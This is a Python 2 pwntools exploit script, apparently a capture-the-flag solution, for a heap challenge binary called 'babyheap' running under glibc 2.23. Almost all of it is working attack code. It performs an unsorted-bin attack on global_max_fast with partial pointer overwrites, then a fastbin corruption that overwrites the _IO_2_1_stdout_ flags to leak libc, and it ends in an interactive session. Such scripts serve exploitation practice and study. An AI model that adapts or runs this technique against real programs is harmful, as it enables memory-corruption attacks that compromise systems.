#!/usr/bin/env python2
from pwn import *
import os

env = {
	'LD_PRELOAD': os.getcwd() + '/libc.so.6'
}

p = process(['./ld-2.23.so','./babyheap'], env = env)
# p = process("./babyheap")
# pause()
gdb.attach(p,"handle SIGALRM ignore")

def add(index,size,data):
	p.sendlineafter(">> ",'1')
	p.sendlineafter("index:\n",str(index))
	p.sendlineafter("size:\n",str(size))
	p.sendafter("data:\n",data)

def edit(index,data):
	p.sendlineafter(">> ",'2')
	p.sendlineafter("index:\n",str(index))
	p.sendafter("data:\n",data)

def delete(index):
	p.sendlineafter(">> ",'3')
	p.sendlineafter("index:\n",str(index))


add(0,100,"A"*8)
add(1,100,"B"*8)
add(2,100,"C"*8)
add(3,100,"D"*8)

delete(0)

#aslr off for now
#0x3c67f8 + 0x155554d61000 -> global_max_fast(target)
# write 0x1555551277e8 (target-16) to bk

edit(0,p64(0) + "\xe8\x07\xbd") 
# edit(0,p64(0) + "\xe8\x77")
# edit(0,p64(0)+"\xe8\x37")

add(4,100,"A"*8)


delete(0)
delete(1)
# pause()
# edit(0,p64(0x71) + "\xdd\x25")
edit(0,p64(0x71)+"\xdd\xf5\xbc")
edit(1,'\x08')

add(5,100,"A"*8)
add(6,100,"A"*8)
payload = "\x00"*3 + p64(0)*6 + p64(0xfbad1800) + p64(0)*3 + '\x00'

print repr(payload)
add(7,100,payload)
# pause()
data = p.recvuntil("1)")

print repr(data)

p.interactive()

